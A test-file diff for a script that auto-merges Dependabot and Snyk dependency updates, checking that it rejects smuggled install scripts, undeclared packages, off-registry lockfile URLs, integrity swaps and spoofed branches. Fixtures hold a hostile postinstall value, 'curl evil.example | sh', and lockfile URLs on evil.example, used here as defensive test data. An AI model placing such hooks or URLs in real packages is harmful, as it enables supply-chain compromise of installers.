@@ -3,8 +3,12 @@ import { describe, expect, it } from "vitest";
 import {
   allowedPathsFor,
   classifyVersionChange,
+  collectResolvedUrls,
   evaluateChangedFiles,
   evaluateChecks,
+  evaluateLockfileChanges,
+  evaluateManifestChanges,
+  evaluatePullRequest,
   evaluateReviews,
   evaluateUpdates,
   identifySource,
@@ -13,6 +17,8 @@ import {
   preflight,
   REQUIRED_CHECKS,
   resolveDependencyType,
+  run,
+  SNYK_AUTHORS,
 } from "../../.github/scripts/auto-merge-dependency-updates.js";
 
 // Verbatim commit message from streetlives/yourpeer.nyc#719, a single-dependency
@@ -504,5 +510,404 @@ describe("evaluateReviews", () => {
       evaluateReviews([{ user: { login: "jbeard4" }, state: "COMMENTED" }])
         .safe,
     ).toBe(true);
+  });
+});
+
+// Verbatim commit message from streetlives/yourpeer.nyc#715, a lockfile-only patch
+// bump of a transitive dependency — the smallest thing the policy actually merges.
+const PATCH_COMMIT = `build(deps): bump postcss-selector-parser from 6.1.0 to 6.1.4
+
+Bumps [postcss-selector-parser](https://github.com/postcss/postcss-selector-parser) from 6.1.0 to 6.1.4.
+- [Release notes](https://github.com/postcss/postcss-selector-parser/releases)
+
+---
+updated-dependencies:
+- dependency-name: postcss-selector-parser
+  dependency-version: 6.1.4
+  dependency-type: indirect
+...
+
+Signed-off-by: dependabot[bot] <support@github.com>`;
+
+const AXIOS_UPDATE = [
+  {
+    name: "axios",
+    fromVersion: "1.8.2",
+    toVersion: "1.8.3",
+    dependencyType: "direct:production",
+    removed: false,
+  },
+];
+
+const BASE_MANIFEST = {
+  name: "yourpeer.nyc-nextjs",
+  scripts: { build: "next build" },
+  dependencies: { axios: "^1.8.2", next: "15.5.3" },
+  devDependencies: { prettier: "^3.3.2" },
+};
+
+function lockfile(packages: Record<string, unknown>) {
+  return {
+    name: "yourpeer.nyc-nextjs",
+    version: "0.1.0",
+    lockfileVersion: 3,
+    packages,
+  };
+}
+
+const BASE_LOCK = lockfile({
+  "node_modules/axios": {
+    version: "1.8.2",
+    resolved: "https://registry.npmjs.org/axios/-/axios-1.8.2.tgz",
+    integrity: "sha512-base",
+  },
+});
+
+describe("evaluateManifestChanges", () => {
+  it("accepts a bump that matches the declared update", () => {
+    const head = {
+      ...BASE_MANIFEST,
+      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.8.3" },
+    };
+    expect(
+      evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE).safe,
+    ).toBe(true);
+  });
+
+  it("rejects a smuggled install script", () => {
+    const head = {
+      ...BASE_MANIFEST,
+      scripts: {
+        ...BASE_MANIFEST.scripts,
+        postinstall: "curl evil.example | sh",
+      },
+      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.8.3" },
+    };
+    const result = evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("outside its dependency lists");
+  });
+
+  it("rejects a dependency the pull request never declared", () => {
+    const head = {
+      ...BASE_MANIFEST,
+      dependencies: {
+        ...BASE_MANIFEST.dependencies,
+        axios: "^1.8.3",
+        "evil-package": "^1.0.0",
+      },
+    };
+    const result = evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("evil-package");
+  });
+
+  it("rejects a version that does not match what the pull request claims", () => {
+    const head = {
+      ...BASE_MANIFEST,
+      dependencies: { ...BASE_MANIFEST.dependencies, axios: "^2.0.0" },
+    };
+    const result = evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("not the 1.8.3");
+  });
+
+  it("rejects a dropped dependency and an unreadable manifest", () => {
+    const head = { ...BASE_MANIFEST, dependencies: { next: "15.5.3" } };
+    expect(
+      evaluateManifestChanges(BASE_MANIFEST, head, AXIOS_UPDATE).safe,
+    ).toBe(false);
+    expect(
+      evaluateManifestChanges(null, BASE_MANIFEST, AXIOS_UPDATE).safe,
+    ).toBe(false);
+  });
+});
+
+describe("evaluateLockfileChanges", () => {
+  it("accepts a bump resolved from the npm registry", () => {
+    const head = lockfile({
+      "node_modules/axios": {
+        version: "1.8.3",
+        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.3.tgz",
+        integrity: "sha512-new",
+      },
+    });
+    expect(evaluateLockfileChanges(BASE_LOCK, head).safe).toBe(true);
+  });
+
+  it("rejects a package newly resolved from outside the registry", () => {
+    const head = lockfile({
+      "node_modules/axios": {
+        version: "1.8.3",
+        resolved: "https://evil.example/axios-1.8.3.tgz",
+        integrity: "sha512-new",
+      },
+    });
+    const result = evaluateLockfileChanges(BASE_LOCK, head);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("evil.example");
+  });
+
+  it("rejects an integrity swap on an unchanged version", () => {
+    const head = lockfile({
+      "node_modules/axios": {
+        version: "1.8.2",
+        resolved: "https://registry.npmjs.org/axios/-/axios-1.8.2.tgz",
+        integrity: "sha512-tampered",
+      },
+    });
+    const result = evaluateLockfileChanges(BASE_LOCK, head);
+    expect(result.safe).toBe(false);
+    expect(result.reason).toContain("integrity hash");
+  });
+
+  it("rejects a lockfileVersion change and an unreadable lockfile", () => {
+    expect(
+      evaluateLockfileChanges(BASE_LOCK, { ...BASE_LOCK, lockfileVersion: 2 })
+        .safe,
+    ).toBe(false);
+    expect(evaluateLockfileChanges(BASE_LOCK, null).safe).toBe(false);
+  });
+
+  it("finds resolved URLs in the legacy dependency tree too", () => {
+    const urls = collectResolvedUrls({
+      dependencies: {
+        axios: {
+          resolved: "https://registry.npmjs.org/axios/-/axios-1.8.2.tgz",
+          dependencies: {
+            follow_redirects: { resolved: "https://evil.example/x.tgz" },
+          },
+        },
+      },
+    });
+    expect([...urls]).toContain("https://evil.example/x.tgz");
+  });
+});
+
+// A minimal stand-in for the Octokit the workflow hands to run(), so the gates can
+// be exercised end to end: which pull requests are candidates, what gets read at
+// which commit, and exactly what is passed to the merge API.
+function fakeGithub(state: any) {
+  const calls: { merges: any[]; comments: any[] } = {
+    merges: [],
+    comments: [],
+  };
+  const pullResponses = [...(state.pullSequence || [state.pull])];
+  const nextPull = () =>
+    pullResponses.length > 1 ? pullResponses.shift() : pullResponses[0];
+
+  const github = {
+    paginate: async (fn: any, params: any) => (await fn(params)).data,
+    rest: {
+      pulls: {
+        list: async () => ({ data: [state.pull] }),
+        get: async () => ({ data: nextPull() }),
+        listFiles: async () => ({
+          data: (state.files || []).map((filename: string) => ({ filename })),
+        }),
+        listCommits: async () => ({
+          data: (state.commits || []).map((message: string) => ({
+            commit: { message },
+          })),
+        }),
+        listReviews: async () => ({ data: state.reviews || [] }),
+        merge: async (params: any) => {
+          calls.merges.push(params);
+          return { data: { merged: true } };
+        },
+      },
+      checks: {
+        listForRef: async () => ({ data: state.checkRuns || passingChecks() }),
+      },
+      repos: {
+        getCombinedStatusForRef: async () => ({
+          data: { statuses: state.statuses || [] },
+        }),
+        getContent: async ({ path, ref }: any) => ({
+          data: JSON.stringify(state.contents?.[`${ref}:${path}`] ?? null),
+        }),
+      },
+      issues: {
+        createComment: async (params: any) => {
+          calls.comments.push(params);
+        },
+      },
+    },
+  };
+
+  return { github, calls };
+}
+
+const CONTEXT = { repo: { owner: "streetlives", repo: "yourpeer.nyc" } };
+
+const CORE = {
+  info: () => {},
+  warning: () => {},
+  summary: {
+    addHeading() {
+      return this;
+    },
+    addTable() {
+      return this;
+    },
+    async write() {},
+  },
+};
+
+function pull(overrides: any = {}) {
+  return {
+    number: 715,
+    title: "build(deps): bump postcss-selector-parser from 6.1.0 to 6.1.4",
+    draft: false,
+    labels: [],
+    mergeable: true,
+    mergeable_state: "blocked",
+    user: { login: "dependabot[bot]" },
+    head: {
+      ref: "dependabot/npm_and_yarn/postcss-selector-parser-6.1.4",
+      sha: "headsha1",
+      repo: { fork: false },
+    },
+    base: { ref: "main", sha: "basesha1" },
+    ...overrides,
+  };
+}
+
+describe("evaluatePullRequest", () => {
+  it("merges a lockfile-only patch bump from Dependabot", async () => {
+    const { github } = fakeGithub({
+      pull: pull(),
+      files: ["package-lock.json"],
+      commits: [PATCH_COMMIT],
+      contents: {
+        "basesha1:package-lock.json": BASE_LOCK,
+        "headsha1:package-lock.json": BASE_LOCK,
+      },
+    });
+
+    const decision = await evaluatePullRequest({
+      github,
+      context: CONTEXT,
+      pullRequest: pull(),
+    });
+    expect(decision.action).toBe("merge");
+    expect(decision.headSha).toBe("headsha1");
+  });
+
+  it("refuses a Snyk-shaped branch from an account not connected to Snyk", async () => {
+    const attacker = pull({
+      user: { login: "drive-by-contributor" },
+      head: { ref: "snyk-fix-abc123", sha: "headsha1", repo: { fork: false } },
+      title: "[Snyk] Security upgrade axios from 1.8.2 to 1.8.3",
+    });
+    const { github } = fakeGithub({ pull: attacker, files: ["package.json"] });
+
+    const decision = await evaluatePullRequest({
+      github,
+      context: CONTEXT,
+      pullRequest: attacker,
+    });
+    expect(decision.action).toBe("skip");
+    expect(decision.reason).toBe("not a dependency update");
+  });
+
+  it("refuses a Snyk pull request that edits anything but its dependency lists", async () => {
+    // The file list alone looks legitimate: package.json only, patch-sized title.
+    const spoofed = pull({
+      user: { login: SNYK_AUTHORS[0] },
+      head: { ref: "snyk-fix-abc123", sha: "headsha1", repo: { fork: false } },
+      title: "[Snyk] Security upgrade axios from 1.8.2 to 1.8.3",
+    });
+    const { github } = fakeGithub({
+      pull: spoofed,
+      files: ["package.json"],
+      commits: ["fix: upgrade axios"],
+      contents: {
+        "basesha1:package.json": BASE_MANIFEST,
+        "headsha1:package.json": {
+          ...BASE_MANIFEST,
+          scripts: {
+            ...BASE_MANIFEST.scripts,
+            postinstall: "curl evil.example | sh",
+          },
+          dependencies: { ...BASE_MANIFEST.dependencies, axios: "^1.8.3" },
+        },
+      },
+    });
+
+    const decision = await evaluatePullRequest({
+      github,
+      context: CONTEXT,
+      pullRequest: spoofed,
+    });
+    expect(decision.action).toBe("skip");
+    expect(decision.reason).toContain("outside its dependency lists");
+  });
+
+  it("waits when a commit lands while the pull request is being evaluated", async () => {
+    const before = pull();
+    const after = pull({
+      head: { ...before.head, sha: "headsha2" },
+    });
+    const { github } = fakeGithub({
+      pull: before,
+      pullSequence: [before, after],
+      files: ["package-lock.json"],
+      commits: [PATCH_COMMIT],
+      contents: {
+        "basesha1:package-lock.json": BASE_LOCK,
+        "headsha1:package-lock.json": BASE_LOCK,
+      },
+    });
+
+    const decision = await evaluatePullRequest({
+      github,
+      context: CONTEXT,
+      pullRequest: before,
+    });
+    expect(decision.action).toBe("wait");
+    expect(decision.reason).toContain("head commit changed");
+  });
+});
+
+describe("run", () => {
+  const mergeableState = () => ({
+    pull: pull(),
+    files: ["package-lock.json"],
+    commits: [PATCH_COMMIT],
+    contents: {
+      "basesha1:package-lock.json": BASE_LOCK,
+      "headsha1:package-lock.json": BASE_LOCK,
+    },
+  });
+
+  it("merges the evaluated commit, not whatever is at the head by then", async () => {
+    const { github, calls } = fakeGithub(mergeableState());
+
+    await run({ github, context: CONTEXT, core: CORE });
+
+    expect(calls.merges).toHaveLength(1);
+    expect(calls.merges[0].sha).toBe("headsha1");
+    expect(calls.merges[0].merge_method).toBe("squash");
+    expect(calls.comments).toHaveLength(1);
+  });
+
+  it("merges nothing on a dry run", async () => {
+    const { github, calls } = fakeGithub(mergeableState());
+
+    await run({ github, context: CONTEXT, core: CORE, dryRun: true });
+
+    expect(calls.merges).toHaveLength(0);
+    expect(calls.comments).toHaveLength(0);
+  });
+
+  it("merges nothing when a required check is still running", async () => {
+    const checkRuns = passingChecks();
+    checkRuns[0] = checkRun(checkRuns[0].name, null, "in_progress", 1);
+    const { github, calls } = fakeGithub({ ...mergeableState(), checkRuns });
+
+    await run({ github, context: CONTEXT, core: CORE });
+
+    expect(calls.merges).toHaveLength(0);
   });
 });
